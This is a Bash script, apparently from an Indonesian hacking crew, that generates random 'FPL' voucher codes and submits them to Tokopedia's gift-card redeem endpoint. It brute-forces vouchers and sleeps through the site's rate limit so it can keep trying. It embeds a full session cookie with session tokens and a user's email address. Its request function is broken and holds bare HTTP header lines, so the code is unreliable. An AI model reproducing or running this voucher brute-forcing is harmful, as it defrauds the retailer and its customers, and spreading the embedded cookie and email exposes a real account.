#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
clear
header
echo "1 Akun Max 10 kali generate"
#Edit Your Cookies Here
ngelog(){
Cookie:"_gorilla_csrf=MTUzOTY3MzE0MXxJa3AyYmpneFoxbEhkWFpyTWtvM1FWbG1URFprWTNOck5sQm1SV2xxSzJSdU5FOUZlQzh4YldsU09UZzlJZ289fNI8EuqM66GMJOyRcf_So8UXdTRODLPBBffnSDKhYPGK; __auc=52ddc683164d9af0cfb77a64029; _ga=GA1.2.932447055.1532660486; cto_lwid=33843b8d-4358-43f8-9d64-a2a15c8d59da; __sonar=13886207210975694451; __asc=e0e489c81667baba6278ce586e3; pulsa-aff=undefined; _gcl_au=1.1.754701325.1539673139; zarget_visitor_info=%7B%7D; _gid=GA1.2.319740559.1539673139; _ga=GA1.3.932447055.1532660486; _gid=GA1.3.319740559.1539673139; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22de7d03b1-6452-45f0-a476-9a8273283405%22%2C%22deviceAdded%22%3Afalse%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22prompt%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; lang=id; _ID_autocomplete_=bd3259be67a3477fb137afb188940802; _BID_TOKOPEDIA_=91acaf97bb5a9afb7d6005e5c8e0ba0b; scs=%7B%22t%22%3A1%7D; ins-gaSSId=5d2a6179-118c-6667-4a62-d156e4d565bb_1539676761; shipping_notif=0; _SID_Tokopedia_=Dz8v_R90hqiTUteAdzeogoa2tT39USQvIWxC2IOzTSydkDTdz8TH1an4iQd5vz4AD5jR74OL9EvUQLIV9RY8alzLuFo7osJxytzqrL7WqysWJK0ACI45tNpCS6gael3_; state=eyJsZCI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20vbXNpc2RuLXZlcmlmaWNhdGlvbi5wbD9hY3Rpb249bXNpc2RuLXZlcmlmaWNhdGlvbiIsInJlZiI6Imh0dHBzOi8vd3d3LnRva29wZWRpYS5jb20vbXNpc2RuLXZlcmlmaWNhdGlvbi5wbD9hY3Rpb249bXNpc2RuLXZlcmlmaWNhdGlvbiIsInV1aWQiOiIwMTVlYTNkMy1mZGI4LTRlN2ItYWFkZS02YmFlNTQ3ZDIxZDAiLCJ0aGVtZSI6ImRlZmF1bHQifQ; insUserData=%7B%22email%22%3A%22joseandreas232%40gmail.com%22%7D; l=1; vn_is=1; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZDFlMjRlYzUtYmExYy00ZTE5LTg2NGItZDZjOWE2MjRmZTk1IiwiaXNfYWpheCI6dHJ1ZX0; insdrSV=64; OPT_IN_SHOWN_TIME=1539673718439
Host: pulsa.tokopedia.com
Referer: https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
X-Requested-With: XMLHttpRequest

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	base="FPL$generate"
	ok=$(ngelog $base | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	echo "$base [ $ok ]"
	if [[ "$ok" =~ 'Anda telah mencoba lebih dari 10x' ]]; then
	secs=$((60 * 60))
		while [ $secs -gt 0 ]; do
   	echo -ne "Menunggu selama : $secs Untuk Auto Run :)\033[0K\r"
   	sleep 1
   	: $((secs--))
	done
	fi
done 
